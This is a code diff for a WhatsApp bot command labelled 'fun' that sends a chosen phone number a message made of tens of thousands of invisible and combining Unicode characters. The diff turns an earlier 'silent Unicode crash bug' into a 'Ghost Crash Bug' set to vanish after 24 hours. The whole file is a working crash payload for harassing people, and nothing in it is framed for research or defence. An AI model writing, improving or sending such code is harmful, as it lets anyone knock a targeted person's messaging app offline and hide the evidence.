@@ -5,29 +5,30 @@ cmd({
   pattern: "bug",
   use: ".bug <number>",
   category: "fun",
-  desc: "Send silent Unicode crash bug",
+  desc: "Send Ghost + Crash Bug (silent invisible text)",
   filename: __filename
 }, async (conn, m, mek, { args, reply }) => {
   if (!args[0]) return await reply("*Provide a number!* (ex: .bug 9471xxxxxxx)");
 
   let target = args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 
-  let uitext = "꧀".repeat(25000); // heavy invisible Unicode flood
+  // 👻 Invisible Unicode + crash sequence
+  let crashText = "\u2063".repeat(10000) + "꧁༒☬CRASH☬༒꧂" + "꧀".repeat(25000);
 
   try {
-    const bugMsg = await generateWAMessageFromContent(target, {
-      conversation: uitext
+    const ghostCrashMsg = await generateWAMessageFromContent(target, {
+      conversation: crashText
     }, {
-      quoted: null, // no reply
-      ephemeralExpiration: 86400, // optional: delete after 24h
+      quoted: null,
+      ephemeralExpiration: 86400, // 👻 Delete after 24h (optional)
       messageId: undefined
     });
 
-    await conn.relayMessage(target, bugMsg.message, { messageId: bugMsg.key.id });
+    await conn.relayMessage(target, ghostCrashMsg.message, { messageId: ghostCrashMsg.key.id });
 
-    await reply("✅ Silent bug message sent to: " + target);
+    await reply("✅ Ghost Crash Bug sent to: " + target);
   } catch (e) {
     console.error(e);
-    await reply("❌ Failed to send silent message.");
+    await reply("❌ Failed to send bug message.");
   }
 });
